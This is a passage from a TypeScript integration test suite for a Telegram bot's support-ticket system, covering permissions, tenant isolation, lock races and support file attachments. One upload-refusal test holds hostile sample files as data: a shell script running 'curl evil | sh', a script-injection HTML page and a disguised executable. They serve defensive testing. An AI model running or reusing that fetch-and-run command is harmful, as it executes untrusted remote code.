    const byAssignee = await web.controller.list(web.request, { assigned: support.id });
    expect(byAssignee.tickets.map((one) => one.id)).toEqual([ticketId]);
    expect((await web.controller.list(web.request, { assigned: 'none' })).tickets).toHaveLength(0);
    expect(
      (await web.controller.list(web.request, { customer: CUSTOMER_TG })).tickets.map(
        (one) => one.id,
      ),
    ).toEqual([ticketId]);
    expect((await web.controller.list(web.request, { customer: OTHER_TG })).tickets).toHaveLength(
      0,
    );
    expect((await web.controller.list(web.request, { status: 'CLOSED' })).tickets).toHaveLength(0);
  });

  it('manages categories: create, rename, hide — a hidden one leaves the customer’s keyboard', async () => {
    const web = await webAs(owner);
    const listed = await web.controller.categories(web.request);
    expect(listed.categories.map((one) => one.title)).toEqual([
      'مشکل اتصال',
      'خرید و پرداخت',
      'سرویس',
      'حساب کاربری',
      'سایر',
    ]);
    const created = await web.controller.createCategory(web.request, {
      idempotencyKey: 'cat-create-0001',
      title: 'نمایندگی',
      sortOrder: 60,
    });
    expect(created.changed).toBe(true);
    const replay = await web.controller.createCategory(web.request, {
      idempotencyKey: 'cat-create-0001',
      title: 'نمایندگی',
      sortOrder: 60,
    });
    expect(replay.category.id).toBe(created.category.id);
    expect(
      (
        await refusalOf(
          web.controller.createCategory(web.request, {
            idempotencyKey: 'cat-create-0002',
            title: 'سرویس',
            sortOrder: 70,
          }),
        )
      ).code,
    ).toBe('ticket.category_invalid');

    const hidden = await web.controller.updateCategory(web.request, created.category.id, {
      isActive: false,
    });
    expect(hidden.category.isActive).toBe(false);
    await handle(tap('tkn:'));
    expect(JSON.stringify(lastSent().reply_markup)).not.toContain('نمایندگی');
  });

  // ===========================================================================
  // Permissions and tenant isolation
  // ===========================================================================

  it('charges each permission, and audits a refusal', async () => {
    const ticketId = await openThroughBot('دسترسی');
    const observer = await createAdmin(ctx.container, tenantA, {
      username: 'observer-tickets',
      roleKeys: ['observer'],
    });
    const support = await createAdmin(ctx.container, tenantA, {
      username: 'support-tickets',
      roleKeys: ['support'],
    });
    const asObserver = await webAs(observer);
    // The observer reads the inbox and the conversation...
    expect((await asObserver.controller.list(asObserver.request, {})).tickets).toHaveLength(1);
    await asObserver.controller.detail(asObserver.request, ticketId);
    // ...and may not reply, assign or close.
    for (const attempt of [
      () =>
        asObserver.controller.reply(asObserver.request, ticketId, {
          idempotencyKey: 'observer-reply',
          text: 'نه',
        }),
      () => asObserver.controller.assign(asObserver.request, ticketId, { adminId: null }),
      () => asObserver.controller.status(asObserver.request, ticketId, { status: 'CLOSED' }),
    ]) {
      expect((await refusalOf(attempt())).kind).toBe('PERMISSION_DENIED');
    }
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM audit_logs WHERE action = 'ticket.reply' AND result = 'DENIED'`,
      ),
    ).toBe(1);

    // Support replies and closes, and may not edit categories.
    const asSupport = await webAs(support);
    await asSupport.controller.reply(asSupport.request, ticketId, {
      idempotencyKey: 'support-reply-1',
      text: 'بله',
    });
    await asSupport.controller.status(asSupport.request, ticketId, { status: 'CLOSED' });
    expect(
      (
        await refusalOf(
          asSupport.controller.createCategory(asSupport.request, {
            idempotencyKey: 'support-category',
            title: 'تازه',
            sortOrder: 5,
          }),
        )
      ).kind,
    ).toBe('PERMISSION_DENIED');
  });

  it('keeps every tenant’s tickets to itself, and every customer’s to them', async () => {
    const ticketId = await openThroughBot('فقط برای من');
    const foreignOwner = await createAdmin(ctx.container, tenantB, {
      username: 'owner-b-tickets',
      roleKeys: ['owner'],
    });
    const actorB = adminActorFor(foreignOwner);
    expect((await ctx.container.tickets.list(tenantB, actorB, { limit: 10 })).length).toBe(0);
    expect((await refusalOf(ctx.container.tickets.detail(tenantB, actorB, ticketId))).code).toBe(
      'ticket.not_found',
    );
    expect(
      (
        await refusalOf(
          ctx.container.tickets.reply(tenantB, actorB, {
            ticketId,
            text: 'از بیرون',
            idempotencyKey: 'foreign-reply',
          }),
        )
      ).code,
    ).toBe('ticket.not_found');

    // Another customer of the SAME tenant is told the ticket does not exist.
    const view = await handle(tap(`tkv:${ticketId}`, OTHER_TG));
    expect(view.replyKey).toBe('bot.ticket.not_found');
    expect(
      (
        await refusalOf(
          ctx.container.tickets.replyByCustomer(tenantA, systemActor('x'), {
            customerId: other,
            botInstanceId: BOT_A,
            ticketId,
            text: 'نفوذ',
            file: null,
            idempotencyKey: 'other-reply',
          }),
        )
      ).code,
    ).toBe('ticket.not_found');
    expect(
      (
        await refusalOf(
          ctx.container.tickets.closeByCustomer(tenantA, systemActor('x'), {
            customerId: other,
            botInstanceId: BOT_A,
            ticketId,
          }),
        )
      ).code,
    ).toBe('ticket.not_found');
  });

  // ===========================================================================
  // Support notifications and attachments for support
  // ===========================================================================

  it('tells support about a new ticket and a customer reply, naming the ticket and never the words', async () => {
    await createAdmin(ctx.container, tenantA, {
      username: 'support-bound',
      roleKeys: ['support'],
      telegramUserId: ADMIN_TG,
    });
    const ticketId = await openThroughBot('متن خصوصی مشتری');
    await ctx.container.relay.processBatch();
    await handle(tap(`tkr:${ticketId}`));
    await handle(text('متن خصوصی دوم'));
    await ctx.container.relay.processBatch();

    const queued = await rows<{
      template_key: string;
      destination: { chatId?: string };
      payload: unknown;
    }>(sql`SELECT template_key, destination, payload FROM notifications ORDER BY created_at`);
    expect(queued.map((one) => [one.template_key, one.destination.chatId])).toEqual([
      ['ops.support.ticket_opened', ADMIN_TG],
      ['ops.support.customer_replied', ADMIN_TG],
    ]);
    expect(JSON.stringify(queued)).not.toContain('متن خصوصی');
  });

  it('serves an attachment’s bytes to support through the API, never its file id', async () => {
    const ticketId = await openThroughBot('پیوست برای پشتیبانی');
    await handle(tap(`tkr:${ticketId}`));
    await handle(documentMessage({ fileName: 'r.pdf', mimeType: 'application/pdf', fileSize: 15 }));
    const web = await webAs(owner);
    const detail = await web.controller.detail(web.request, ticketId);
    const withFile = detail.messages.find((one) => one.attachment !== null)!;
    expect(withFile.attachment).toEqual({
      kind: 'DOCUMENT',
      mimeType: 'application/pdf',
      fileName: 'r.pdf',
      fileSize: 15,
    });
    expect(JSON.stringify(detail)).not.toContain('doc-');

    const headers: Record<string, string> = {};
    let body: Buffer | null = null;
    const reply = {
      header(name: string, value: string) {
        headers[name] = value;
        return reply;
      },
      async send(bytes: Buffer) {
        body = bytes;
        return reply;
      },
    } as unknown as FastifyReply;
    await web.controller.attachment(web.request, reply, withFile.id);
    expect(headers['content-type']).toBe('application/octet-stream');
    expect(headers['content-disposition']).toBe(`attachment; filename="${withFile.id}"`);
    expect(String(body)).toBe('%PDF-1.4 ticket');
  });
  // ===========================================================================
  // Codex review of #96
  // ===========================================================================

  it('sends support’s reply through the bot the ticket was opened on, not the customer’s first bot', async () => {
    await ctx.container.database.db.execute(
      sql`UPDATE bot_instances SET status = 'ACTIVE' WHERE id = ${BOT_A2}`,
    );
    // The customer registered through BOT_A (beforeEach) and opens this ticket through BOT_A2.
    const viaA2 = (update: Envelope): Envelope => ({ ...update, botInstanceId: BOT_A2 });
    await handle(viaA2(tap('tkn:')));
    const category = callbacksOf(lastSent()).find((data) => data.startsWith('tkc:'))!;
    await handle(viaA2(tap(category)));
    await handle(viaA2(text('از ربات دوم می‌نویسم')));
    const [ticket] = await rows<{ id: string; bot_instance_id: string }>(
      sql`SELECT id, bot_instance_id FROM tickets`,
    );
    expect(ticket!.bot_instance_id).toBe(BOT_A2);

    const web = await webAs(owner);
    await web.controller.reply(web.request, ticket!.id, {
      idempotencyKey: 'reply-through-a2',
      text: 'پاسخ از پشتیبانی',
    });
    const [queued] = await rows<{ bot_instance_id: string }>(
      sql`SELECT bot_instance_id FROM customer_notifications WHERE kind = 'TICKET_REPLY'`,
    );
    expect(queued!.bot_instance_id).toBe(BOT_A2);

    sent = [];
    await deliver();
    const toCustomer = messages().filter((one) => String(one.body.chat_id) === CUSTOMER_TG);
    expect(toCustomer).toHaveLength(1);
    expect(toCustomer[0]!.url).toContain('seed-token-acme-2');
    expect(toCustomer[0]!.url).not.toContain('seed-token-acme-1');
  });

  /** Runs `body` while a holder connection owns this customer's RECEIPT window lock. */
  async function withReceiptLockHeld<T>(
    body: (holder: { query(text: string, values?: unknown[]): Promise<unknown> }) => Promise<T>,
  ): Promise<T> {
    return ctx.container.database.withClient(async (holder) => {
      await holder.query('BEGIN');
      try {
        await holder.query('SELECT pg_advisory_xact_lock($1, hashtext($2))', [
          RECEIPT_CAPTURE_LOCK_CLASS,
          `${tenantA.tenantId}:${BOT_A}:${customer}`,
        ]);
        const result = await body(holder);
        await holder.query('COMMIT');
        return result;
      } catch (error: unknown) {
        await holder.query('ROLLBACK');
        throw error;
      }
    });
  }

  async function pendingTopup(key: string): Promise<string> {
    await ctx.container.paymentGateways.configure(tenantA, adminActorFor(owner), {
      idempotencyKey: `cfg-${key}`,
      provider: 'MANUAL_TRANSFER',
      config: OPEN_ROUTE,
    });
    const topup = await ctx.container.payments.requestWalletTopupTyped(
      { ...tenantA, botInstanceId: BOT_A },
      systemActor(key),
      customer,
      { idempotencyKey: key, amount: money(500_000n, 'IRT'), provider: 'MANUAL_TRANSFER' },
    );
    return topup.payment.id;
  }

  const openTicketWindows = () =>
    count(
      sql`SELECT count(*)::int AS n FROM customer_text_captures
           WHERE customer_id = ${customer} AND closed_at IS NULL
             AND purpose IN ('TICKET_NEW_MESSAGE', 'TICKET_REPLY')`,
    );

  it('decides between a ticket window and a receipt window under both locks, in the read', async () => {
    const ticketId = await openThroughBot('رسید یا تیکت');
    const paymentId = await pendingTopup('topup-race');
    await handle(tap(`tkr:${ticketId}`));
    expect(await openTicketWindows()).toBe(1);

    /*
     * The receipt window opens WHILE the photo is being read: the holder owns the receipt
     * lock, the photo's read blocks on it (holding the ticket window's lock), and the
     * holder opens a receipt window and commits. The read must then see the newer receipt
     * window and leave the ticket window alone. The unlocked choice this replaced made its
     * decision before the holder committed, and filed the photo into the ticket.
     */
    const { running } = await withReceiptLockHeld(async (holder) => {
      const running = handle(photoMessage('رسید'));
      const deadline = Date.now() + 5_000;
      for (;;) {
        const waiting = await count(
          sql`SELECT count(*)::int AS n FROM pg_locks
               WHERE locktype = 'advisory' AND classid = ${RECEIPT_CAPTURE_LOCK_CLASS}
                 AND objid = (SELECT hashtext(${`${tenantA.tenantId}:${BOT_A}:${customer}`})::oid)
                 AND NOT granted`,
        );
        if (waiting >= 1) break;
        if (Date.now() > deadline) {
          await running.catch(() => undefined);
          throw new Error('the ticket file read never waited on the receipt window lock');
        }
        await new Promise((done) => setTimeout(done, 25));
      }
      await holder.query(
        `INSERT INTO receipt_captures (id, tenant_id, bot_instance_id, customer_id, payment_id, opened_at, expires_at)
         VALUES ($1, $2, $3, $4, $5, clock_timestamp(), clock_timestamp() + interval '10 minutes')`,
        [randomUUID(), tenantA.tenantId, BOT_A, customer, paymentId],
      );
      // Wrapped, so the holder commits BEFORE the read is awaited.
      return { running };
    });

    const outcome = await running;
    expect(outcome.replyKey).not.toBe('bot.ticket.reply_sent');
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM ticket_messages WHERE ticket_id = ${ticketId}`,
      ),
    ).toBe(1);
    expect(await openTicketWindows()).toBe(1);
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM payment_receipts WHERE payment_id = ${paymentId}`,
      ),
    ).toBe(1);
  });

  it('files a photo into the ticket when the ticket window is the newer prompt', async () => {
    const ticketId = await openThroughBot('اول رسید، بعد تیکت');
    const paymentId = await pendingTopup('topup-older');
    await ctx.container.database.db.execute(
      sql`INSERT INTO receipt_captures (id, tenant_id, bot_instance_id, customer_id, payment_id, opened_at, expires_at)
          VALUES (${randomUUID()}, ${tenantA.tenantId}, ${BOT_A}, ${customer}, ${paymentId},
                  now() - interval '1 minute', now() + interval '10 minutes')`,
    );
    await handle(tap(`tkr:${ticketId}`));
    const filed = await handle(photoMessage('تصویر خطا'));
    expect(filed.replyKey).toBe('bot.ticket.reply_sent');
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM payment_receipts WHERE payment_id = ${paymentId}`,
      ),
    ).toBe(0);
    // The receipt window is untouched: still open for the receipt it was opened for.
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM receipt_captures WHERE payment_id = ${paymentId} AND closed_at IS NULL`,
      ),
    ).toBe(1);
  });

  it('tells the customer a ticket support closed is closed, and reopens no window for it', async () => {
    const ticketId = await openThroughBot('پنجرهٔ کهنه');
    await handle(tap(`tkr:${ticketId}`));
    await ctx.container.tickets.setStatus(tenantA, adminActorFor(owner), {
      ticketId,
      status: 'CLOSED',
    });
    // Content the service would refuse as invalid — which it used to check FIRST, and the
    // runtime answered by reopening a reply window on a closed ticket.
    const blank = await handle(text('   '));
    expect(blank.replyKey).toBe('bot.ticket.already_closed');
    expect(await openTicketWindows()).toBe(0);

    await handle(tap(`tkv:${ticketId}`));
    await ctx.container.database.db.execute(
      sql`INSERT INTO customer_text_captures (id, tenant_id, bot_instance_id, customer_id, purpose, subject_id, opened_at, expires_at)
          VALUES (${randomUUID()}, ${tenantA.tenantId}, ${BOT_A}, ${customer}, 'TICKET_REPLY', ${ticketId},
                  now(), now() + interval '10 minutes')`,
    );
    const long = await handle(text('ب'.repeat(3001)));
    expect(long.replyKey).toBe('bot.ticket.already_closed');
    expect(await openTicketWindows()).toBe(0);
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM ticket_messages WHERE ticket_id = ${ticketId} AND sender_type = 'CUSTOMER'`,
      ),
    ).toBe(1);
  });

  it('closes and reopens a ticket at its message cap, writing no fact row past the cap', async () => {
    const ticketId = await openThroughBot('پر');
    // One below the cap: the opening message plus these.
    await ctx.container.database.db.execute(
      sql`INSERT INTO ticket_messages (id, tenant_id, ticket_id, sender_type, body, idempotency_key, request_hash)
          SELECT gen_random_uuid(), ${tenantA.tenantId}, ${ticketId}, 'CUSTOMER', 'پیام ' || g,
                 'bulk-' || g, 'hash-' || g
            FROM generate_series(1, ${TICKET_MESSAGES_MAX_PER_TICKET - 2}) AS g`,
    );
    const total = () =>
      count(sql`SELECT count(*)::int AS n FROM ticket_messages WHERE ticket_id = ${ticketId}`);
    expect(await total()).toBe(TICKET_MESSAGES_MAX_PER_TICKET - 1);
    const actor = adminActorFor(owner);

    // Below the cap the close writes its fact, which fills the ticket.
    expect(
      (await ctx.container.tickets.setStatus(tenantA, actor, { ticketId, status: 'CLOSED' })).ticket
        .status,
    ).toBe('CLOSED');
    expect(await total()).toBe(TICKET_MESSAGES_MAX_PER_TICKET);

    // At the cap the reopen and the next close still happen, and add no row.
    expect(
      (
        await ctx.container.tickets.setStatus(tenantA, actor, {
          ticketId,
          status: 'WAITING_FOR_SUPPORT',
        })
      ).ticket.status,
    ).toBe('WAITING_FOR_SUPPORT');
    expect(
      (
        await ctx.container.tickets.closeByCustomer(tenantA, systemActor('cap-close'), {
          customerId: customer,
          botInstanceId: BOT_A,
          ticketId,
        })
      ).ticket.status,
    ).toBe('CLOSED');
    expect(await total()).toBe(TICKET_MESSAGES_MAX_PER_TICKET);

    // Each is still audited, and says the conversation did not get its fact.
    const audits = await rows<{ action: string; after: Record<string, unknown> }>(
      sql`SELECT action, after FROM audit_logs
           WHERE entity_id = ${ticketId} AND action IN ('ticket.status', 'ticket.close')
           ORDER BY occurred_at, id`,
    );
    expect(audits).toEqual([
      { action: 'ticket.status', after: { status: 'CLOSED' } },
      { action: 'ticket.status', after: { status: 'WAITING_FOR_SUPPORT', factRecorded: false } },
      { action: 'ticket.close', after: { status: 'CLOSED', factRecorded: false } },
    ]);
  });

  it('filters the inbox by an exact username, however many usernames share its prefix', async () => {
    const ticketId = await openThroughBot('نام کاربری');
    // Registered LAST, so more than a page of prefix matches sorts ahead of it.
    await ctx.container.database.db.execute(
      sql`UPDATE customers SET username = 'Mary', created_at = now() + interval '1 hour'
           WHERE id = ${customer}`,
    );
    for (let index = 0; index < 21; index += 1) {
      const telegramUserId = String(952_000 + index);
      await ctx.container.customers.resolveFromUpdate(tenantA, systemActor(`m-${String(index)}`), {
        idempotencyKey: `resolve-mary-${String(index)}`,
        telegramUserId,
        from: { id: Number(telegramUserId), first_name: 'M', username: `mary${String(index)}` },
        botInstanceId: BOT_A,
      });
    }
    const web = await webAs(owner);
    for (const spelled of ['mary', '@MARY', ' Mary ']) {
      expect(
        (await web.controller.list(web.request, { customer: spelled })).tickets.map(
          (one) => one.id,
        ),
      ).toEqual([ticketId]);
    }
    // A prefix is not a name.
    expect((await web.controller.list(web.request, { customer: 'mar' })).tickets).toHaveLength(0);
  });

  it('answers a replayed reply with the delivery the lane reached, not PENDING', async () => {
    const ticketId = await openThroughBot('بازپخش');
    const web = await webAs(owner);
    const request = { idempotencyKey: 'reply-replayed-1', text: 'پاسخ یک‌بار' };
    const first = await web.controller.reply(web.request, ticketId, request);
    expect(first.message.delivery).toBe('PENDING');
    await deliver();
    const again = await web.controller.reply(web.request, ticketId, request);
    expect(again.message).toMatchObject({ id: first.message.id, delivery: 'DELIVERED' });
    expect(again.message.authorAdminUsername).toBe('owner-tickets');
  });
  // ===========================================================================
  // Codex review of #96, round 2
  // ===========================================================================

  it('refuses a close from a customer blocked after the surface resolved them', async () => {
    const ticketId = await openThroughBot('مسدود');
    await ctx.container.database.db.execute(
      sql`UPDATE customers SET status = 'BLOCKED', blocked_at = now() WHERE id = ${customer}`,
    );
    expect(
      await refusalOf(
        ctx.container.tickets.closeByCustomer(tenantA, systemActor('blocked-close'), {
          customerId: customer,
          botInstanceId: BOT_A,
          ticketId,
        }),
      ),
    ).toMatchObject({ code: 'commerce.customer_blocked' });
    expect(
      (await rows<{ status: string }>(sql`SELECT status FROM tickets WHERE id = ${ticketId}`))[0],
    ).toEqual({ status: 'OPEN' });
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM ticket_messages WHERE ticket_id = ${ticketId} AND sender_type = 'SYSTEM'`,
      ),
    ).toBe(0);
  });

  it('keeps a ticket to the bot it was opened through: another bot of the tenant sees none of it', async () => {
    await ctx.container.database.db.execute(
      sql`UPDATE bot_instances SET status = 'ACTIVE' WHERE id = ${BOT_A2}`,
    );
    const viaA2 = (update: Envelope): Envelope => ({ ...update, botInstanceId: BOT_A2 });
    await handle(viaA2(tap('tkn:')));
    const category = callbacksOf(lastSent()).find((data) => data.startsWith('tkc:'))!;
    await handle(viaA2(tap(category)));
    await handle(viaA2(text('فقط در ربات دوم')));
    const [ticket] = await rows<{ id: string }>(sql`SELECT id FROM tickets`);
    const ticketId = ticket!.id;
    const state = async () =>
      (
        await rows<{ status: string; messages: number }>(
          sql`SELECT t.status, (SELECT count(*)::int FROM ticket_messages m WHERE m.ticket_id = t.id) AS messages
                FROM tickets t WHERE t.id = ${ticketId}`,
        )
      )[0];
    const before = await state();

    // Bot A: the list does not show it, and every way in answers as for no ticket at all.
    const list = await handle(tap('tkl:'));
    expect(list.replyKey).toBe('bot.ticket.list_empty');
    expect(callbacksOf(lastSent())).not.toContain(`tkv:${ticketId}`);
    for (const data of [
      `tkv:${ticketId}`,
      `tkr:${ticketId}`,
      `tkq:${ticketId}`,
      `tkx:${ticketId}`,
    ]) {
      expect((await handle(tap(data))).replyKey).toBe('bot.ticket.not_found');
    }
    expect(await openTicketWindows()).toBe(0);
    expect(
      await refusalOf(
        ctx.container.tickets.replyByCustomer(tenantA, systemActor('a1-reply'), {
          customerId: customer,
          botInstanceId: BOT_A,
          ticketId,
          text: 'از ربات اول',
          file: null,
          idempotencyKey: 'a1-reply',
        }),
      ),
    ).toMatchObject({ code: 'ticket.not_found' });
    expect(
      await refusalOf(
        ctx.container.tickets.closeByCustomer(tenantA, systemActor('a1-close'), {
          customerId: customer,
          botInstanceId: BOT_A,
          ticketId,
        }),
      ),
    ).toMatchObject({ code: 'ticket.not_found' });
    expect(await state()).toEqual(before);

    // Bot A2, where it was opened, still has all of it.
    await handle(viaA2(tap('tkl:')));
    expect(callbacksOf(lastSent())).toContain(`tkv:${ticketId}`);
    expect((await handle(viaA2(tap(`tkv:${ticketId}`)))).replyKey).toBe('bot.ticket.view');
    expect((await handle(viaA2(tap(`tkr:${ticketId}`)))).replyKey).toBe('bot.ticket.reply_prompt');
    expect((await handle(viaA2(text('پاسخ از ربات دوم')))).replyKey).toBe('bot.ticket.reply_sent');
    expect((await handle(viaA2(tap(`tkx:${ticketId}`)))).replyKey).toBe('bot.ticket.closed');
    // The opening message, the reply and the close's fact.
    expect(await state()).toEqual({ status: 'CLOSED', messages: 3 });
  });

  // ===========================================================================
  // HF-A7: support's file on a reply
  // ===========================================================================

  const PNG = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from('support-screenshot-body'),
  ]);
  const PDF = Buffer.from('%PDF-1.7\nراهنمای اتصال\n%%EOF\n');
  const EXE = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64, 0x90)]);
  const fileOf = (fileName: string, mimeType: string, bytes: Buffer) => ({
    fileName,
    mimeType,
    contentBase64: bytes.toString('base64'),
  });
  const uploads = () => sent.filter((one) => /\/send(Photo|Document)$/u.test(one.url));

  /** The attachment route's answer: its headers and its bytes. */
  async function download(
    web: Awaited<ReturnType<typeof webAs>>,
    messageId: string,
  ): Promise<{ headers: Record<string, string>; body: Buffer }> {
    const headers: Record<string, string> = {};
    let body: Buffer = Buffer.alloc(0);
    const reply = {
      header(name: string, value: string) {
        headers[name] = value;
        return reply;
      },
      async send(bytes: Buffer) {
        body = bytes;
        return reply;
      },
    } as unknown as FastifyReply;
    await web.controller.attachment(web.request, reply, messageId);
    return { headers, body };
  }

  const fileRow = async (messageId: string) =>
    (
      await rows<{
        staged: boolean;
        telegram_file_id: string | null;
        purged: boolean;
        file_name: string;
        byte_length: number;
      }>(
        sql`SELECT content IS NOT NULL AS staged, telegram_file_id, purged_at IS NOT NULL AS purged,
                   file_name, byte_length
              FROM ticket_reply_files WHERE message_id = ${messageId}`,
      )
    )[0];
  const laneOf = async (messageId: string) =>
    rows<{ kind: string; state: string; attempts: number }>(
      sql`SELECT kind, state, attempts FROM customer_notifications
           WHERE subject_id = ${messageId} ORDER BY created_at, id`,
    );

  it('sends support’s file beside the reply from bounded staging, and lets the bytes go once Telegram has them', async () => {
    const ticketId = await openThroughBot('اتصال برقرار نمی‌شود');
    const web = await webAs(owner);
    const reply = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'reply-with-photo-1',
      text: 'این تصویر تنظیمات درست است.',
      attachment: fileOf('C:\\fakepath\\screen.PNG', 'image/png', PNG),
    });
    // The message is written, with its file, before anything is sent.
    expect(reply.message).toMatchObject({
      senderType: 'ADMIN',
      body: 'این تصویر تنظیمات درست است.',
      attachment: {
        kind: 'PHOTO',
        mimeType: 'image/png',
        fileName: 'screen.png',
        fileSize: PNG.byteLength,
      },
      delivery: 'PENDING',
      attachmentDelivery: 'PENDING',
    });
    expect(await fileRow(reply.message.id)).toEqual({
      staged: true,
      telegram_file_id: null,
      purged: false,
      file_name: 'screen.png',
      byte_length: PNG.byteLength,
    });
    // Two lane rows naming the message, the text's first; neither carries the bytes.
    expect(await laneOf(reply.message.id)).toEqual([
      { kind: 'TICKET_REPLY', state: 'PENDING', attempts: 0 },
      { kind: 'TICKET_REPLY_ATTACHMENT', state: 'PENDING', attempts: 0 },
    ]);
    // Support reads its own staged file back through the attachment route.
    const staged = await download(web, reply.message.id);
    expect(staged.body.equals(PNG)).toBe(true);
    expect(staged.headers['content-type']).toBe('application/octet-stream');
    expect(JSON.stringify(await web.controller.detail(web.request, ticketId))).not.toContain(
      PNG.toString('base64'),
    );

    sent = [];
    await deliver();
    const toCustomer = sent.filter((one) => one.raw.includes(Buffer.from(CUSTOMER_TG)));
    expect(toCustomer.map((one) => one.url.split('/').at(-1))).toEqual([
      'sendMessage',
      'sendPhoto',
    ]);
    const photo = toCustomer[1]!;
    // The verified bytes, under the clean name, with the ticket in the caption.
    expect(photo.raw.includes(PNG)).toBe(true);
    expect(photo.raw.toString('utf8')).toContain('filename="screen.png"');
    expect(photo.raw.toString('utf8')).toContain('Content-Type: image/png');
    const detail = await web.controller.detail(web.request, ticketId);
    expect(photo.raw.toString('utf8')).toContain(`#${String(detail.ticket.number)}`);

    // Delivered: Telegram's handle stamped, the bytes cleared, in the same transaction.
    expect(detail.messages.at(-1)).toMatchObject({
      delivery: 'DELIVERED',
      attachmentDelivery: 'DELIVERED',
    });
    expect(await fileRow(reply.message.id)).toMatchObject({
      staged: false,
      telegram_file_id: 'sent-file-1',
      purged: true,
    });
    // From here support reads it back from Telegram, with the ticket's bot; no id leaks.
    sent = [];
    const fetched = await download(web, reply.message.id);
    expect(String(fetched.body)).toBe('%PDF-1.4 ticket');
    expect(sent.find((one) => one.url.endsWith('/getFile'))?.body).toEqual({
      file_id: 'sent-file-1',
    });
    expect(JSON.stringify(await web.controller.detail(web.request, ticketId))).not.toContain(
      'sent-file-1',
    );

    // The customer's conversation view marks support's message as carrying a file.
    await handle(tap(`tkv:${ticketId}`));
    expect(lastText()).toContain(CATALOGUE_FA['bot.ticket.attachment_marker']);
  });

  it('refuses a dangerous, spoofed or oversized file, and writes nothing at all', async () => {
    const ticketId = await openThroughBot('فایل خطرناک');
    const web = await webAs(owner);
    const attempt = (attachment: ReturnType<typeof fileOf>, key: string) =>
      web.controller
        .reply(web.request, ticketId, { idempotencyKey: key, text: 'پیوست', attachment })
        .then(
          () => null,
          (error: unknown) =>
            isNexaError(error)
              ? [error.code, (error.details as { refusal?: string }).refusal]
              : error,
        );
    // An executable renamed to a PDF: the bytes decide, not the name or the declared type.
    expect(await attempt(fileOf('guide.pdf', 'application/pdf', EXE), 'bad-file-0001')).toEqual([
      'ticket.attachment_refused',
      'CONTENT_MISMATCH',
    ]);
    // A shell script renamed to text, and an HTML page renamed to text.
    for (const [index, bytes] of [
      Buffer.from('#!/bin/sh\ncurl evil | sh\n'),
      Buffer.from('<html><script>alert(1)</script></html>'),
    ].entries()) {
      expect(
        await attempt(fileOf('notes.txt', 'text/plain', bytes), `bad-file-01${String(index)}`),
      ).toEqual(['ticket.attachment_refused', 'CONTENT_MISMATCH']);
    }
    // Declared honestly, an executable, an installer, a script and an archive are not listed.
    for (const [index, [name, type]] of [
      ['setup.exe', 'application/x-msdownload'],
      ['setup.msi', 'application/x-msi'],
      ['run.bat', 'application/x-bat'],
      ['app.apk', 'application/vnd.android.package-archive'],
      ['bundle.zip', 'application/zip'],
    ].entries()) {
      expect(await attempt(fileOf(name!, type!, EXE), `bad-file-02${String(index)}`)).toEqual([
        'ticket.attachment_refused',
        'TYPE_NOT_ALLOWED',
      ]);
    }
    // A real PDF whose name hides an executable's extension.
    expect(
      await attempt(fileOf('invoice.exe.pdf', 'application/pdf', PDF), 'bad-file-0003'),
    ).toEqual(['ticket.attachment_refused', 'NAME_NOT_ALLOWED']);
    // One byte over a photo's bound, refused by the service.
    const bigPng = Buffer.concat([PNG, Buffer.alloc(5 * 1024 * 1024 + 1 - PNG.byteLength, 0x41)]);
    expect(await attempt(fileOf('big.png', 'image/png', bigPng), 'bad-file-0004')).toEqual([
      'ticket.attachment_refused',
      'TOO_LARGE',
    ]);
    // One byte over the largest type's bound: the HTTP schema refuses it before the service.
    const bigPdf = Buffer.concat([PDF, Buffer.alloc(10 * 1024 * 1024 + 1 - PDF.byteLength, 0x41)]);
    await expect(
      web.controller.reply(web.request, ticketId, {
        idempotencyKey: 'bad-file-0005',
        text: 'پیوست',
        attachment: fileOf('big.pdf', 'application/pdf', bigPdf),
      }),
    ).rejects.toThrow();
    // ...and the service refuses it too, whoever calls it.
    const service = await refusalOf(
      ctx.container.tickets.reply(tenantA, adminActorFor(owner), {
        ticketId,
        text: 'پیوست',
        attachment: fileOf('big.pdf', 'application/pdf', bigPdf),
        idempotencyKey: 'bad-file-0006',
      }),
    );
    expect(service.code).toBe('ticket.attachment_refused');

    // Nothing was written: no message, no staged file, no notification, no status change.
    expect(
      await count(sql`SELECT count(*)::int AS n FROM ticket_messages WHERE sender_type = 'ADMIN'`),
    ).toBe(0);
    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_reply_files`)).toBe(0);
    expect(await count(sql`SELECT count(*)::int AS n FROM customer_notifications`)).toBe(0);
    expect((await web.controller.detail(web.request, ticketId)).ticket.status).toBe('OPEN');
  });

  it('keeps the reply and its file when Telegram refuses the upload, retries it, and never re-sends an unknown one', async () => {
    const ticketId = await openThroughBot('ارسال ناموفق');
    const web = await webAs(owner);

    // Telegram refuses the upload: the text arrives, the file stays PENDING with its bytes.
    fileMode = 'REFUSE';
    const refused = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'file-refused-01',
      text: 'راهنما پیوست است.',
      attachment: fileOf('guide.pdf', 'application/pdf', PDF),
    });
    await deliver();
    expect(await laneOf(refused.message.id)).toEqual([
      { kind: 'TICKET_REPLY', state: 'DELIVERED', attempts: 1 },
      { kind: 'TICKET_REPLY_ATTACHMENT', state: 'PENDING', attempts: 1 },
    ]);
    expect(await fileRow(refused.message.id)).toMatchObject({ staged: true, purged: false });

    // A rate limit spends no attempt.
    fileMode = 'RATE_LIMIT';
    await deliver();
    expect((await laneOf(refused.message.id))[1]).toMatchObject({
      state: 'PENDING',
      attempts: 1,
    });

    // Telegram recovers: the document goes once, and only the document.
    fileMode = 'OK';
    sent = [];
    await deliver();
    expect(uploads().map((one) => one.url.split('/').at(-1))).toEqual(['sendDocument']);
    expect(uploads()[0]!.raw.includes(PDF)).toBe(true);
    expect(messages()).toHaveLength(0);
    expect(await fileRow(refused.message.id)).toMatchObject({ staged: false, purged: true });

    // An unknown outcome: UNCONFIRMED, never uploaded again — and the reply and its file stay.
    fileMode = 'SERVER_ERROR';
    const unknown = await web.controller.reply(web.request, ticketId, {
